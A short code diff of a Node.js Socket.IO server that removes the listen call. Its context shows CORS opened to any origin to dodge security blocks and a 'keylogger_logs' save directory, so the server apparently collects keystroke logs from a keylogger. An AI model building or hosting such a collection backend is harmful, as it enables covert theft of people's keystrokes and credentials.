@@ -11,9 +11,6 @@ const io = socketIo(server, {
     cors: { origin: "*" } // Evita bloqueos de seguridad
 });
 const PORT = process.env.PORT || 3001; // Render asigna el puerto mediante una variable de entorno
-server.listen(PORT, () => {
-    console.log(`Servidor corriendo en puerto ${PORT}`);
-});
 
 // --- CONFIGURACIÓN DE CARPETAS ---
 const keyloggerSaveDir = path.join(__dirname, 'keylogger_logs');
